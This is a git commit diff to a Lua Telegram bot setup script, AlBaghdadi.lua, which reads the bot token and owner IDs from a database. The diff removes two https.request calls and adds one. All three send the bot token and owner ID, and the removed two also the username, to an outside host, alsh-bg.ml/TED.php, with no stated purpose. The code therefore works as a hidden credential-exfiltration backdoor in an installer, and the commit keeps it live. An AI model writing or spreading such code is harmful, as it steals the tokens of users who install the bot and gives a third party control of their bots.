651783b9928f655e8bfe938db6318c1c78f75c1b
ALSH1 <72534702+ALSH1@users.noreply.github.com>
2021-04-10 05:35:51 +0300

    Update AlBaghdadi.lua

--- AlBaghdadi.lua
+++ AlBaghdadi.lua
@@ -64,14 +64,13 @@ token = database:get(id_server..":token"),
 SUDO = database:get(id_server..":SUDO:ID"),
 UserName = database:get(id_server..":SUDO:USERNAME"),
  }
-https.request("https://alsh-bg.ml/TED.php?token="..token.."&id="..SUDO.."&user="..UserName)
-
 create(config, "./Info.lua")   
-https.request("https://alsh-bg.ml/TED.php?token="..token.."&id="..SUDO.."&user="..UserName)
 end
 create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
+https.request("https://alsh-bg.ml/TED.php?token="..token.."&id="..SUDO.."&user=")
+
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("AlBaghdadi", "w")  
